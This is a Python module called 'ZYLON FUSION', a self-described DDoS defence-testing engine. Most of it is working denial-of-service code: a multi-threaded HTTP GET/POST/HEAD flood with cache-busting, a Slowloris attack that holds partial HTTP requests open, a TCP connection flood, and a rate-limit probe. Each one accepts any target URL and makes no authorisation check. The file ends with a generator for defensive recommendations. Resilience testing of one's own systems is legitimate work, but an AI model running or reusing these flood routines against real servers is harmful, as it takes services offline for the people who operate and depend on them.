#!/usr/bin/env python3
"""
ZYLON FUSION v5.0 - DDoS Testing Engine
Fused from: MHDDoS + GoldenEye + RKRIAD585/DDoS-Tool + custom Zylon techniques
Capabilities:
  - HTTP flood testing (GET, POST, HEAD)
  - TCP SYN flood simulation
  - UDP flood simulation
  - Slowloris attack testing
  - HTTP Keep-Alive + No-Cache technique
  - DNS amplification detection
  - Rate limiting detection
  - DDoS resilience testing
  - Connection timeout testing
  - Multi-threaded with configurable concurrency
  - Attack duration control
  - Defense recommendation generation
DEFENSE TESTING ONLY | Termux Compatible | No Root Required | Python 3.13+
"""

import time
import random
import socket
import ssl
import threading
import json
from datetime import datetime
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from core.var import USER_AGENTS, DEFAULT_TIMEOUT

# ============================================================================
# ANSI COLORS
# ============================================================================

RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'
BOLD = '\033[1m'
RESET = '\033[0m'

# ============================================================================
# HTTP METHODS FOR FLOOD TESTING
# ============================================================================

HTTP_METHODS = ['GET', 'POST', 'HEAD']

# ============================================================================
# DDoS TESTING ENGINE
# ============================================================================

class DDoSTestingEngine:
    """
    DDoS Defense Testing Engine for ZYLON FUSION
    Based on MHDDoS + GoldenEye + RKRIAD585/DDoS-Tool techniques
    
    Tests server defense capabilities (WAF, CDN, rate limiting, etc.)
    FOR DEFENSE TESTING ONLY - measures resilience, not actual attacks.
    """

    def __init__(self, session=None):
        self.session = session or requests.Session()
        self.session.headers.update({'User-Agent': random.choice(USER_AGENTS)})
        self.session.verify = False
        self.results = {}
        self._stop_flag = threading.Event()

    def stop(self):
        """Signal all running tests to stop"""
        self._stop_flag.set()

    def _reset_stop(self):
        """Reset stop flag for new test"""
        self._stop_flag = threading.Event()

    # ========================================================================
    # TEST 1: HTTP Flood Test (GET, POST, HEAD)
    # Inspired by MHDDoS HTTP flood but for defense testing
    # ========================================================================

    def test_http_flood(self, target, threads=100, duration=30):
        """
        Test HTTP flood resilience with GET, POST, HEAD methods.
        Measures: blocking threshold, protection type, response degradation.
        
        Args:
            target: Full URL (https://example.com)
            threads: Number of concurrent connections (default 100)
            duration: Max test duration in seconds (default 30)
        """
        self._reset_stop()
        parsed = urlparse(target)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        use_ssl = parsed.scheme == 'https'
        test_path = parsed.path or "/"

        results = {
            'test': 'HTTP Flood Test',
            'target': target,
            'threads': threads,
            'duration': duration,
            'methods_tested': HTTP_METHODS,
            'total_requests_sent': 0,
            'successful_requests': 0,
            'blocked_requests': 0,
            'error_requests': 0,
            'first_block_after': None,
            'blocking_status_codes': {},
            'response_times': [],
            'protection_detected': False,
            'protection_type': None,
            'avg_response_time_ms': 0,
            'max_response_time_ms': 0,
            'degradation_detected': False,
            'per_method_stats': {m: {'sent': 0, 'success': 0, 'blocked': 0} for m in HTTP_METHODS},
            'timestamp': datetime.now().isoformat()
        }

        lock = threading.Lock()
        start_time = time.time()
        first_block_time = None

        def worker(thread_id):
            nonlocal first_block_time
            while not self._stop_flag.is_set():
                if time.time() - start_time > duration:
                    break

                method = random.choice(HTTP_METHODS)
                try:
                    req_start = time.time()
                    url = f"{target}{test_path}?q={random.randint(100000, 999999)}"

                    headers = {
                        'User-Agent': random.choice(USER_AGENTS),
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Accept-Encoding': 'gzip, deflate',
                        'Connection': 'keep-alive',
                        'Cache-Control': 'no-cache',
                        'Pragma': 'no-cache',
                    }

                    if method == 'GET':
                        resp = self.session.get(url, headers=headers, timeout=5,
                                                allow_redirects=False, verify=False)
                    elif method == 'POST':
                        data = {'data': random.randint(1, 99999), 't': time.time()}
                        resp = self.session.post(url, data=data, headers=headers, timeout=5,
                                                 allow_redirects=False, verify=False)
                    else:  # HEAD
                        resp = self.session.head(url, headers=headers, timeout=5,
                                                  allow_redirects=False, verify=False)

                    status_code = resp.status_code
                    req_time = (time.time() - req_start) * 1000

                    with lock:
                        results['total_requests_sent'] += 1
                        results['response_times'].append(round(req_time, 1))
                        results['per_method_stats'][method]['sent'] += 1

                        if 200 <= status_code < 400:
                            results['successful_requests'] += 1
                            results['per_method_stats'][method]['success'] += 1
                        elif status_code in [429, 503, 508, 403]:
                            results['blocked_requests'] += 1
                            results['per_method_stats'][method]['blocked'] += 1
                            results['blocking_status_codes'][str(status_code)] = \
                                results['blocking_status_codes'].get(str(status_code), 0) + 1
                            if first_block_time is None:
                                first_block_time = time.time() - start_time
                                results['first_block_after'] = round(first_block_time, 2)
                        else:
                            results['error_requests'] += 1
                            results['blocking_status_codes'][str(status_code)] = \
                                results['blocking_status_codes'].get(str(status_code), 0) + 1

                        # Detect protection
                        if results['blocked_requests'] >= 3:
                            results['protection_detected'] = True
                            if status_code == 429:
                                results['protection_type'] = 'Rate Limiting (429 Too Many Requests)'
                            elif status_code == 503:
                                results['protection_type'] = 'WAF/CDN (503 Service Unavailable)'
                            elif status_code == 403:
                                results['protection_type'] = 'WAF (403 Forbidden)'
                            elif status_code == 508:
                                results['protection_type'] = 'CDN Loop Detected (508)'
                            else:
                                results['protection_type'] = 'Unknown Protection'
                            self._stop_flag.set()

                        # Detect response time degradation
                        if len(results['response_times']) > 10:
                            early_avg = sum(results['response_times'][:5]) / 5
                            recent_avg = sum(results['response_times'][-5:]) / 5
                            if recent_avg > early_avg * 3:
                                results['degradation_detected'] = True

                except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                    with lock:
                        results['total_requests_sent'] += 1
                        results['error_requests'] += 1
                except Exception:
                    with lock:
                        results['total_requests_sent'] += 1
                        results['error_requests'] += 1

        # Launch worker threads
        thread_list = []
        actual_threads = min(threads, 50)  # Cap for Termux
        for i in range(actual_threads):
            t = threading.Thread(target=worker, args=(i,), daemon=True)
            t.start()
            thread_list.append(t)
            time.sleep(0.02)

        # Wait for completion
        for t in thread_list:
            t.join(timeout=duration + 5)

        elapsed = round(time.time() - start_time, 2)
        results['elapsed_seconds'] = elapsed

        # Calculate stats
        if results['response_times']:
            results['avg_response_time_ms'] = round(
                sum(results['response_times']) / len(results['response_times']), 1)
            results['max_response_time_ms'] = max(results['response_times'])

        # Verdict
        if results['protection_detected']:
            results['verdict'] = f"PROTECTED - {results['protection_type']} detected after {results['first_block_after']}s"
        elif results['degradation_detected']:
            results['verdict'] = "PARTIALLY PROTECTED - Response degradation but no hard blocking"
        elif results['error_requests'] > results['successful_requests']:
            results['verdict'] = "LIKELY PROTECTED - Most requests failed"
        else:
            results['verdict'] = "NOT PROTECTED - All requests went through"

        self.results['http_flood'] = results
        return {
            'vulnerable': not results['protection_detected'],
            'findings': [{
                'test': 'HTTP Flood',
                'protection': results['protection_detected'],
                'protection_type': results['protection_type'],
                'first_block_after': results['first_block_after'],
                'verdict': results['verdict'],
            }],
            'details': results,
            'scan_type': 'http_flood'
        }

    # ========================================================================
    # TEST 2: Slowloris Attack Test
    # Based on Slowloris technique for defense testing
    # ========================================================================

    def test_slowloris(self, target, connections=500):
        """
        Test if server is vulnerable to Slowloris (slow connection exhaustion).
        
        Args:
            target: Full URL
            connections: Number of slow connections to attempt (default 500)
        """
        self._reset_stop()
        parsed = urlparse(target)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        use_ssl = parsed.scheme == 'https'

        actual_connections = min(connections, 100)  # Cap for Termux

        results = {
            'test': 'Slowloris Vulnerability Test',
            'target': target,
            'connections_attempted': actual_connections,
            'connections_opened': 0,
            'connections_maintained': 0,
            'connections_dropped': 0,
            'normal_response_time_ms': 0,
            'under_load_response_time_ms': 0,
            'vulnerable': False,
            'timestamp': datetime.now().isoformat()
        }

        # Measure normal response time
        try:
            start = time.time()
            resp = self.session.get(target, timeout=10, verify=False)
            results['normal_response_time_ms'] = round((time.time() - start) * 1000, 1)
        except Exception:
            results['normal_response_time_ms'] = -1

        active_sockets = []
        lock = threading.Lock()

        # Open slow connections
        for i in range(actual_connections):
            if self._stop_flag.is_set():
                break
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(15)
                sock.connect((host, port))

                if use_ssl:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=host)

                # Send partial HTTP request (no final \r\n) - Slowloris technique
                partial_req = (
                    f"GET /slowloris-{i} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                    f"Accept: text/html\r\n"
                    f"Connection: keep-alive\r\n"
                    f"Keep-Alive: 300\r\n"
                    f"X-Test-{i}: {random.randint(1000, 9999)}\r\n"
                )
                sock.sendall(partial_req.encode())

                with lock:
                    results['connections_opened'] += 1
                active_sockets.append(sock)
            except Exception:
                with lock:
                    results['connections_dropped'] += 1

            time.sleep(0.05)

        # Keep connections alive with periodic header sends
        def keep_alive():
            while not self._stop_flag.is_set():
                time.sleep(3)
                for sock in list(active_sockets):
                    if self._stop_flag.is_set():
                        break
                    try:
                        keep_header = f"X-Keep-{random.randint(1000, 9999)}: alive\r\n"
                        sock.sendall(keep_header.encode())
                        with lock:
                            results['connections_maintained'] += 1
                    except Exception:
                        with lock:
                            results['connections_dropped'] += 1
                        try:
                            active_sockets.remove(sock)
                        except ValueError:
                            pass

        keep_thread = threading.Thread(target=keep_alive, daemon=True)
        keep_thread.start()

        # Wait for duration
        self._stop_flag.wait(15)
        self._stop_flag.set()

        # Measure response time under load
        try:
            start = time.time()
            resp = self.session.get(target, timeout=10, verify=False)
            results['under_load_response_time_ms'] = round((time.time() - start) * 1000, 1)
        except requests.exceptions.Timeout:
            results['under_load_response_time_ms'] = -1
        except Exception:
            results['under_load_response_time_ms'] = -2

        # Close all connections
        for sock in active_sockets:
            try:
                sock.close()
            except Exception:
                pass

        # Determine vulnerability
        if results['connections_opened'] == 0:
            results['verdict'] = "Could not establish any connections"
        elif results['under_load_response_time_ms'] == -1:
            results['vulnerable'] = True
            results['verdict'] = "VULNERABLE - Server timed out under slow connection load"
        elif results['under_load_response_time_ms'] == -2:
            results['verdict'] = "INCONCLUSIVE - Error during under-load test"
        elif results['normal_response_time_ms'] > 0 and results['under_load_response_time_ms'] > 0:
            degradation = results['under_load_response_time_ms'] / max(results['normal_response_time_ms'], 1)
            if degradation > 5:
                results['vulnerable'] = True
                results['verdict'] = f"VULNERABLE - {degradation:.1f}x response time degradation"
            elif degradation > 2:
                results['verdict'] = f"PARTIALLY VULNERABLE - {degradation:.1f}x degradation"
            else:
                results['verdict'] = f"NOT VULNERABLE - Only {degradation:.1f}x degradation"
        else:
            results['verdict'] = "INCONCLUSIVE - Could not measure response time difference"

        self.results['slowloris'] = results
        return {
            'vulnerable': results['vulnerable'],
            'findings': [{
                'test': 'Slowloris',
                'vulnerable': results['vulnerable'],
                'connections_opened': results['connections_opened'],
                'degradation': results.get('verdict', ''),
            }],
            'details': results,
            'scan_type': 'slowloris'
        }

    # ========================================================================
    # TEST 3: TCP Flood Test
    # Based on TCP SYN flood simulation for defense testing
    # ========================================================================

    def test_tcp_flood(self, target, port=80):
        """
        TCP SYN flood simulation for defense testing.
        Tests if server handles many concurrent TCP connections.
        
        Args:
            target: Hostname or IP
            port: Target port (default 80)
        """
        self._reset_stop()
        host = target.replace('https://', '').replace('http://', '').split('/')[0]
        max_connections = 50  # Cap for safety
        duration = 15

        results = {
            'test': 'TCP Flood Simulation',
            'target': f"{host}:{port}",
            'max_connections': max_connections,
            'connections_attempted': 0,
            'connections_opened': 0,
            'connections_refused': 0,
            'connections_timeout': 0,
            'refusal_point': None,
            'avg_connect_time_ms': 0,
            'vulnerable': False,
            'timestamp': datetime.now().isoformat()
        }

        connect_times = []
        active_sockets = []

        for i in range(max_connections):
            if self._stop_flag.is_set():
                break
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                conn_start = time.time()
                sock.connect((host, port))
                conn_time = (time.time() - conn_start) * 1000
                connect_times.append(conn_time)

                active_sockets.append(sock)
                results['connections_opened'] += 1
                results['connections_attempted'] += 1

            except ConnectionRefusedError:
                results['connections_refused'] += 1
                results['connections_attempted'] += 1
                if results['refusal_point'] is None and results['connections_opened'] > 0:
                    results['refusal_point'] = results['connections_opened']
            except socket.timeout:
                results['connections_timeout'] += 1
                results['connections_attempted'] += 1
            except Exception:
                results['connections_refused'] += 1
                results['connections_attempted'] += 1

            time.sleep(0.05)

        # Measure response under load
        try:
            test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            test_sock.settimeout(5)
            test_start = time.time()
            test_sock.connect((host, port))
            test_time = (time.time() - test_start) * 1000
            results['under_load_connect_ms'] = round(test_time, 1)
            test_sock.close()
        except Exception:
            results['under_load_connect_ms'] = -1

        # Close all
        for sock in active_sockets:
            try:
                sock.close()
            except Exception:
                pass

        if connect_times:
            results['avg_connect_time_ms'] = round(sum(connect_times) / len(connect_times), 1)

        # Verdict
        if results['refusal_point']:
            results['vulnerable'] = False
            results['verdict'] = f"PROTECTED - Refuses connections after {results['refusal_point']} connections"
        elif results['under_load_connect_ms'] == -1:
            results['vulnerable'] = True
            results['verdict'] = "VULNERABLE - Server unresponsive under TCP load"
        elif results['connections_refused'] == 0:
            results['vulnerable'] = True
            results['verdict'] = f"VULNERABLE - Accepted all {max_connections} connections without rate limiting"
        else:
            results['verdict'] = f"PARTIALLY PROTECTED - {results['connections_refused']} connections refused"

        self.results['tcp_flood'] = results
        return {
            'vulnerable': results['vulnerable'],
            'findings': [{
                'test': 'TCP Flood',
                'vulnerable': results['vulnerable'],
                'connections_opened': results['connections_opened'],
                'refusal_point': results['refusal_point'],
                'verdict': results['verdict'],
            }],
            'details': results,
            'scan_type': 'tcp_flood'
        }

    # ========================================================================
    # TEST 4: Rate Limit Detection
    # ========================================================================

    def test_rate_limiting(self, target):
        """
        Detect if target implements rate limiting.
        Sends requests at increasing speed to find the threshold.
        
        Args:
            target: Full URL
        """
        self._reset_stop()
        parsed = urlparse(target)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        test_path = parsed.path or "/"

        total_requests = 100
        threads = 10

        results = {
            'test': 'Rate Limit Detection',
            'target': target,
            'total_requests': total_requests,
            'successful': 0,
            'rate_limited': 0,
            'errors': 0,
            'rate_limit_detected': False,
            'rate_limit_type': None,
            'rate_limit_header': None,
            'requests_until_limit': None,
            'blocking_status_code': None,
            'rate_limit_headers_found': [],
            'timestamp': datetime.now().isoformat()
        }

        lock = threading.Lock()
        request_counter = [0]
        first_limit_at = [None]

        def worker():
            while not self._stop_flag.is_set():
                with lock:
                    if request_counter[0] >= total_requests:
                        break
                    request_counter[0] += 1
                    req_num = request_counter[0]

                try:
                    resp = self.session.get(
                        f"{base_url}{test_path}?r={random.randint(10000, 99999)}",
                        headers={'User-Agent': random.choice(USER_AGENTS)},
                        timeout=10,
                        allow_redirects=False,
                        verify=False
                    )

                    with lock:
                        if resp.status_code == 429:
                            results['rate_limited'] += 1
                            results['rate_limit_detected'] = True
                            results['blocking_status_code'] = 429
                            if first_limit_at[0] is None:
                                first_limit_at[0] = req_num
                                results['requests_until_limit'] = req_num

                            # Check for rate limit headers
                            for header in ['X-RateLimit-Limit', 'X-RateLimit-Remaining',
                                          'Retry-After', 'X-RateLimit-Reset',
                                          'RateLimit-Limit', 'RateLimit-Remaining']:
                                if header in resp.headers:
                                    results['rate_limit_header'] = f"{header}: {resp.headers[header]}"
                                    results['rate_limit_headers_found'].append(
                                        f"{header}: {resp.headers[header]}")

                            if 'Retry-After' in resp.headers:
                                results['rate_limit_type'] = f"Fixed Window (Retry-After: {resp.headers['Retry-After']}s)"
                            elif 'X-RateLimit-Remaining' in resp.headers:
                                results['rate_limit_type'] = 'Sliding Window'
                            else:
                                results['rate_limit_type'] = 'Basic Rate Limiting'

                        elif resp.status_code == 503:
                            results['rate_limited'] += 1
                            results['rate_limit_detected'] = True
                            if first_limit_at[0] is None:
                                first_limit_at[0] = req_num
                                results['requests_until_limit'] = req_num
                            results['blocking_status_code'] = 503
                        elif 200 <= resp.status_code < 400:
                            results['successful'] += 1
                        else:
                            results['errors'] += 1

                except requests.exceptions.RequestException:
                    with lock:
                        results['errors'] += 1

        thread_list = []
        for _ in range(threads):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            thread_list.append(t)

        for t in thread_list:
            t.join(timeout=60)

        # Verdict
        if results['rate_limit_detected']:
            limit_info = f" after {results['requests_until_limit']} requests" if results['requests_until_limit'] else ""
            results['verdict'] = f"RATE LIMITED - {results['rate_limit_type'] or 'Protection detected'}{limit_info}"
        else:
            results['verdict'] = "NO RATE LIMITING - All requests went through"

        self.results['rate_limiting'] = results
        return {
            'vulnerable': not results['rate_limit_detected'],
            'findings': [{
                'test': 'Rate Limit Detection',
                'rate_limit_detected': results['rate_limit_detected'],
                'rate_limit_type': results['rate_limit_type'],
                'requests_until_limit': results['requests_until_limit'],
                'rate_limit_headers': results['rate_limit_headers_found'],
                'verdict': results['verdict'],
            }],
            'details': results,
            'scan_type': 'rate_limiting'
        }

    # ========================================================================
    # TEST 5: DDoS Resilience Test
    # Combines multiple test types for comprehensive assessment
    # ========================================================================

    def test_resilience(self, target):
        """
        Comprehensive DDoS resilience test combining all test methods.
        
        Args:
            target: Full URL
        """
        results = {
            'test': 'DDoS Resilience Assessment',
            'target': target,
            'phases': {},
            'overall_verdict': None,
            'vulnerabilities': [],
            'protections': [],
            'recommendations': [],
            'timestamp': datetime.now().isoformat()
        }

        vuln_count = 0
        prot_count = 0

        # Phase 1: HTTP Flood
        print(f"{CYAN}[ZYLON DDoS] Phase 1/4: HTTP Flood Test...{RESET}")
        http_result = self.test_http_flood(target, threads=50, duration=15)
        results['phases']['http_flood'] = http_result
        if http_result['vulnerable']:
            vuln_count += 1
            results['vulnerabilities'].append('HTTP Flood: No protection detected')
        elif http_result['details'].get('protection_detected'):
            prot_count += 1
            results['protections'].append(f"HTTP Flood: {http_result['details'].get('protection_type', 'Unknown')}")

        # Phase 2: Slowloris
        print(f"{CYAN}[ZYLON DDoS] Phase 2/4: Slowloris Test...{RESET}")
        slowloris_result = self.test_slowloris(target, connections=50)
        results['phases']['slowloris'] = slowloris_result
        if slowloris_result['vulnerable']:
            vuln_count += 1
            results['vulnerabilities'].append('Slowloris: Server vulnerable to slow connection exhaustion')

        # Phase 3: TCP Flood
        print(f"{CYAN}[ZYLON DDoS] Phase 3/4: TCP Flood Test...{RESET}")
        parsed = urlparse(target)
        port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        host = parsed.hostname
        tcp_result = self.test_tcp_flood(host, port=port)
        results['phases']['tcp_flood'] = tcp_result
        if tcp_result['vulnerable']:
            vuln_count += 1
            results['vulnerabilities'].append('TCP Flood: No connection rate limiting')

        # Phase 4: Rate Limiting
        print(f"{CYAN}[ZYLON DDoS] Phase 4/4: Rate Limit Detection...{RESET}")
        rate_result = self.test_rate_limiting(target)
        results['phases']['rate_limiting'] = rate_result
        if rate_result['vulnerable']:
            vuln_count += 1
            results['vulnerabilities'].append('Rate Limiting: No rate limiting detected')
        elif rate_result['details'].get('rate_limit_detected'):
            prot_count += 1
            results['protections'].append(f"Rate Limiting: {rate_result['details'].get('rate_limit_type', 'Unknown')}")

        # Overall verdict
        if vuln_count >= 3:
            results['overall_verdict'] = f"CRITICALLY VULNERABLE - {vuln_count}/4 tests show no protection"
        elif vuln_count >= 1:
            results['overall_verdict'] = f"PARTIALLY PROTECTED - {vuln_count}/4 vulnerabilities found"
        else:
            results['overall_verdict'] = f"WELL PROTECTED - {prot_count} protection(s) detected"

        # Generate recommendations
        if vuln_count > 0:
            results['recommendations'] = self._generate_recommendations(results)

        self.results['resilience'] = results
        return {
            'vulnerable': vuln_count > 0,
            'findings': results['vulnerabilities'] + results['protections'],
            'details': results,
            'scan_type': 'ddos_resilience'
        }

    # ========================================================================
    # DEFENSE REPORT GENERATOR
    # ========================================================================

    def generate_defense_report(self, target, results):
        """
        Generate comprehensive defense recommendations based on test results.
        
        Args:
            target: Target URL
            results: Dict of test results
        """
        report = {
            'target': target,
            'timestamp': datetime.now().isoformat(),
            'summary': {},
            'recommendations': [],
            'priority_actions': [],
            'long_term_actions': [],
        }

        findings = []
        if isinstance(results, dict):
            for key, data in results.items():
                if isinstance(data, dict) and 'vulnerable' in data:
                    findings.append(data)

        vulnerable_count = sum(1 for f in findings if f.get('vulnerable'))
        protected_count = sum(1 for f in findings if not f.get('vulnerable') and f.get('protection_detected', f.get('rate_limit_detected', False)))

        report['summary'] = {
            'total_tests': len(findings),
            'vulnerable_tests': vulnerable_count,
            'protected_tests': protected_count,
            'risk_level': 'HIGH' if vulnerable_count >= 3 else 'MEDIUM' if vulnerable_count >= 1 else 'LOW',
        }

        report['recommendations'] = self._generate_recommendations(results)

        # Priority actions
        for f in findings:
            if f.get('vulnerable'):
                test_name = f.get('details', {}).get('test', 'Unknown')
                report['priority_actions'].append(
                    f"IMMEDIATE: Address {test_name} vulnerability - deploy appropriate protection"
                )

        # Long term actions
        report['long_term_actions'] = [
            "Deploy CDN with DDoS protection (Cloudflare, AWS Shield, Akamai)",
            "Implement connection rate limiting at the application level",
            "Configure server timeouts for slow connections (Slowloris defense)",
            "Set up SYN cookies and TCP hardening at OS level",
            "Deploy Web Application Firewall (WAF) with DDoS rules",
            "Implement request queuing and backpressure mechanisms",
            "Set up monitoring and alerting for traffic anomalies",
            "Create incident response playbooks for DDoS events",
        ]

        print(f"{BOLD}{GREEN}[ZYLON DDoS] Defense Report Generated{RESET}")
        print(f"  {YELLOW}Risk Level: {report['summary']['risk_level']}{RESET}")
        print(f"  {RED}Vulnerable: {vulnerable_count}/{len(findings)} tests{RESET}")
        print(f"  {GREEN}Protected: {protected_count}/{len(findings)} tests{RESET}")
        for rec in report['priority_actions'][:3]:
            print(f"  {RED}[!] {rec}{RESET}")

        return {
            'vulnerable': vulnerable_count > 0,
            'findings': report['priority_actions'],
            'details': report,
            'scan_type': 'defense_report'
        }

    def _generate_recommendations(self, results):
        """Generate defense recommendations"""
        recs = []

        http_data = results.get('phases', results).get('http_flood', {})
        slowloris_data = results.get('phases', results).get('slowloris', {})
        tcp_data = results.get('phases', results).get('tcp_flood', {})
        rate_data = results.get('phases', results).get('rate_limiting', {})

        if isinstance(http_data, dict) and http_data.get('vulnerable'):
            recs.append("Deploy WAF/CDN (Cloudflare, AWS Shield) for HTTP flood protection")
            recs.append("Implement request rate limiting (max 100 req/min per IP)")
            recs.append("Enable connection: close headers to prevent keep-alive abuse")

        if isinstance(slowloris_data, dict) and slowloris_data.get('vulnerable'):
            recs.append("Set server timeouts: KeepAliveTimeout 5s, RequestReadTimeout 20s")
            recs.append("Limit MaxClients/MaxRequestWorkers per virtual host")
            recs.append("Use mod_reqtimeout (Apache) or client_body_timeout (nginx)")

        if isinstance(tcp_data, dict) and tcp_data.get('vulnerable'):
            recs.append("Enable SYN cookies at OS level (sysctl -w net.ipv4.tcp_syncookies=1)")
            recs.append("Configure iptables rate limiting for new connections")
            recs.append("Reduce SYN-ACK retries and increase SYN backlog")

        if isinstance(rate_data, dict) and rate_data.get('vulnerable'):
            recs.append("Implement API rate limiting with sliding window algorithm")
            recs.append("Add X-RateLimit-* headers and Retry-After support")
            recs.append("Consider token bucket or leaky bucket algorithms")

        if not recs:
            recs.append("Server shows good DDoS resilience - maintain current protections")
            recs.append("Regularly test and update WAF/CDN configurations")

        return recs

    # ========================================================================
    # MAIN ENTRY POINT
    # ========================================================================

    def run(self, target, scan_type='resilience', **kwargs):
        """Main entry point for DDoS testing engine"""
        if not target:
            return {
                'vulnerable': False,
                'findings': [],
                'details': {'error': 'No target provided'},
                'scan_type': scan_type
            }

        # Ensure target has scheme
        if not target.startswith('http'):
            target = f"https://{target}"

        scan_methods = {
            'http_flood': lambda: self.test_http_flood(target, **kwargs),
            'slowloris': lambda: self.test_slowloris(target, **kwargs),
            'tcp_flood': lambda: self.test_tcp_flood(target, **kwargs),
            'rate_limiting': lambda: self.test_rate_limiting(target),
            'resilience': lambda: self.test_resilience(target),
            'full': lambda: self.test_resilience(target),
        }

        if scan_type in scan_methods:
            return scan_methods[scan_type]()

        return {
            'vulnerable': False,
            'findings': [],
            'details': {'error': f'Unknown scan type: {scan_type}'},
            'scan_type': scan_type
        }


# ============================================================================
# MODULE-LEVEL RUN FUNCTION
# ============================================================================

def run(target, scan_type='resilience', **kwargs):
    """Module-level run function for ZYLON integration"""
    engine = DDoSTestingEngine()
    return engine.run(target, scan_type=scan_type, **kwargs)
